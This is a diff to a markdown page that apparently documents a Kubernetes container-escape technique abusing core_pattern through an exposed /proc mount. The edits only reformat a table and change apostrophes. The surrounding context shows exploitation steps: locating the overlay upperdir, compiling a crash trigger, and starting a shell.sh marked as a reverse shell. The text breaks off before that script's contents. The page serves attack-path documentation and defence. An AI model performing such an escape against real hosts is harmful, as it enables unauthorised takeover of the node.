@@ -9,8 +9,8 @@ mitreAttackTactic: TA0004 - Privilege escalation
 
 Container escape via the `core_pattern` `usermode_helper` in the case of an exposed `/proc` mount.
 
-| Source                                    | Destination                           | MITRE                            |
-| ----------------------------------------- | ------------------------------------- |----------------------------------|
+| Source                                | Destination                 | MITRE                                                               |
+| ------------------------------------- | --------------------------- | ------------------------------------------------------------------- |
 | [Container](../entities/container.md) | [Node](../entities/node.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |
 
 ## Details
@@ -37,7 +37,7 @@ proc /hostproc proc rw,nosuid,nodev,noexec,relatime 0 0
 
 ## Exploitation
 
-First find the path of the container’s filesystem on the host. This can be done by retrieving the current mounts (see [VOLUME_DISCOVER](./VOLUME_DISCOVER.md#checks)). Looks for the `upperdir` value of the overlayfs entry associated with containerd:
+First find the path of the container's filesystem on the host. This can be done by retrieving the current mounts (see [VOLUME_DISCOVER](./VOLUME_DISCOVER.md#checks)). Looks for the `upperdir` value of the overlayfs entry associated with containerd:
 
 ```bash
 $ cat /etc/mtab  # or `cat /proc/mounts` depending on the system
@@ -73,7 +73,7 @@ apt update && apt install gcc
 gcc -o crash /tmp/crash.c
 ```
 
-Next write a shell script to be triggered inside the container’s file system as `shell.sh`:
+Next write a shell script to be triggered inside the container's file system as `shell.sh`:
 
 ```bash
 # Reverse shell
